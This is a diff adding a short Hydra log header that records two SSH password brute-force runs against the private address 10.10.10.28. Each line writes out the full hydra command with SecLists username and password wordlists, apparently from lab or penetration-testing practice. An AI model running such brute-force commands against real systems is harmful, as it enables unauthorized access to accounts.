@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2021-09-01 20:33:37 on 10.10.10.28 ssh (hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -o hydra/ssh-bruteforce.txt 10.10.10.28 ssh)
+# Hydra v9.2 run at 2021-09-01 20:35:00 on 10.10.10.28 ssh (hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -o hydra/ssh-bruteforce.txt -v 10.10.10.28 ssh)
